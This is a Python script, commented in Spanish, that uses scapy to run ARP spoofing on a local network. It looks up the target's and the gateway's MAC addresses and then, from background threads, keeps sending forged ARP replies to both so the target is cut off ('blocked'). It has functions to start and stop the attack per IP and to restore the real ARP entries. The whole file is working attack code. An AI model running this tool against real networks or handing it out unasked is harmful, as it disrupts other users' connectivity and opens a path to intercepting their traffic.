import scapy.all as scapy
import threading
import time

IP_GATEWAY = "192.168.1.1"
hilos_activos = {}

def obtener_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = broadcast / arp_request
    respuesta = scapy.srp(paquete, timeout=2, verbose=False, iface="en0")[0]
    if respuesta:
        return respuesta[0][1].hwsrc
    return None

def _spoofear(ip_objetivo, mac_objetivo, ip_falsear, mi_mac):
    """Envía un ARP reply directo (Capa 2) diciéndole a ip_objetivo que ip_falsear está en mi MAC."""
    arp_reply = scapy.ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_falsear, hwsrc=mi_mac)
    frame = scapy.Ether(dst=mac_objetivo) / arp_reply
    scapy.sendp(frame, verbose=False, iface="en0")

def _restaurar(ip_objetivo, mac_objetivo, ip_falsear, mac_falsear):
    """Restaura la info ARP real explícitamente por Capa 2."""
    arp_reply = scapy.ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_falsear, hwsrc=mac_falsear)
    frame = scapy.Ether(dst=mac_objetivo) / arp_reply
    scapy.sendp(frame, count=4, verbose=False, iface="en0")

def _ciclo_bloqueo(ip_objetivo):
    mi_mac = scapy.get_if_hwaddr("en0")
    mac_objetivo = obtener_mac(ip_objetivo)
    mac_gateway = obtener_mac(IP_GATEWAY)

    if not mac_objetivo or not mac_gateway:
        print(f"No se pudo encontrar la MAC de {ip_objetivo} o del gateway.")
        hilos_activos.pop(ip_objetivo, None)
        return

    print(f"🔒 Iniciando bloqueo (ARP spoofing) de {ip_objetivo}...")

    while not hilos_activos[ip_objetivo]["detener"]:
        # Le decimos al objetivo: "el router (ip_gateway) está en mi MAC"
        _spoofear(ip_objetivo, mac_objetivo, IP_GATEWAY, mi_mac)
        # Le decimos al router: "el objetivo (ip_objetivo) está en mi MAC"
        _spoofear(IP_GATEWAY, mac_gateway, ip_objetivo, mi_mac)
        time.sleep(2)

    _restaurar(ip_objetivo, mac_objetivo, IP_GATEWAY, mac_gateway)
    _restaurar(IP_GATEWAY, mac_gateway, ip_objetivo, mac_objetivo)
    print(f"🔓 {ip_objetivo} desbloqueado, ARP restaurado.")

def bloquear_ip(ip_objetivo):
    if ip_objetivo in hilos_activos:
        return
    hilos_activos[ip_objetivo] = {"detener": False}
    hilo = threading.Thread(target=_ciclo_bloqueo, args=(ip_objetivo,), daemon=True)
    hilo.start()

def desbloquear_ip(ip_objetivo):
    if ip_objetivo in hilos_activos:
        hilos_activos[ip_objetivo]["detener"] = True

def obtener_bloqueadas():
    return list(hilos_activos.keys())